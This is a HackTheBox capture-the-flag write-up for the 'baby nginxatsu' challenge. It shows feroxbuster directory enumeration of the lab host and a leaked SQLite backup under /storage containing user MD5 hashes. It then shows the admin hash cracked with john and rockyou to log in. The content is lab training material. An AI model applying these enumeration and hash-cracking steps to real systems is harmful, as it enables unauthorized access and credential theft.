# baby nginxatsu

Completed: Yes
Platform: HackTheBox

In the beginning, I created a new user, logged in, and created a few Nginx configs. Then, I tried to put something in the fields, like the OS command. After that, I started `feroxbuster`. And it found stuff.

```bash
feroxbuster -u http://159.65.54.50:32211/ -w /usr/share/wordlists/dirb/big.txt                                                                                                                                                       1 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://159.65.54.50:32211/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       21l       56w      603c http://159.65.54.50:32211/.htaccess
200        0l        0w        0c http://159.65.54.50:32211/favicon.ico
200        2l        3w       24c http://159.65.54.50:32211/robots.txt
301        7l       11w      162c http://159.65.54.50:32211/static
301        7l       11w      162c http://159.65.54.50:32211/storage
[####################] - 5m     20468/20468   0s      found:5       errors:950    
[####################] - 5m     20468/20468   68/s    http://159.65.54.50:32211/
```

The main thing here is `/storage`which is a url where the Nginx configs are stored. Go there and find tar archive. When you download and extract it, you will find sqlite database, which stores the users and its passwords.

```bash
1	jr	nginxatsu-adm-01@makelarid.es	e7816e9a10590b1e33b87ec2fa65e6cd	pvzDhfIetM6ZRJYrkAOoMbivEtIVlPPeOamI2QlrR4AMAgoAv0zeMt7tM4TE9ayanqZa		2021-07-07 09:42:40	2021-07-07 09:42:40
2	Giovann1	nginxatsu-giv@makelarid.es	293062e161ac6cfb3c5e1e6bdb4669b2	zCg04WCvwo9e3R8ZzEnFx0fy9K4qyQ48l3zyVCC0x9iSzhv7LHS3DFzSANbusYjbrZYg		2021-07-07 09:42:40	2021-07-07 09:42:40
3	me0wth	nginxatsu-me0wth@makelarid.es	60d25455b1cf8fee89257c35764c8683	GXdANM5wU3Me9ANIKVBmibYfQbTWYH5AYH8YMaIAO92EJldKocSh5N0VrVxY6sAn2acr		2021-07-07 09:42:40	2021-07-07 09:42:40
```

Grab the hash from admin and crack it with john:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 XOP 4x2])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
adminadmin1      (?)
1g 0:00:00:00 DONE (2021-07-07 06:19) 1.010g/s 10461Kp/s 10461Kc/s 10461KC/s admincambodia..admin1921
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

You'll receive the flag after logging in as an admin.